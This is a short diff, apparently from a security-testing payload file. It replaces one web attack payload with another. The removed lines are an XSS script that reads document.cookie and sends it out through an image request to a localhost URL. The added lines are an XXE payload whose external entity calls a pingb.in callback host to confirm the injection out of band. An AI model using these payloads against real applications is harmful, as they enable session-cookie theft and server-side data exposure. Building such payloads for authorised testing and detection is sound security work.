@@ -1,5 +1,4 @@
-<script>
-alert(document.cookie);
-var i=new Image;
-i.src="http://localhost/?"+document.cookie;
-</script>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [<!ELEMENT foo ANY>
+    <!ENTITY xxe SYSTEM "http://pingb.in/p/62c5efc7c4d1e3a1d8764c8756cb">]>
+    <foo>&xxe;</foo>
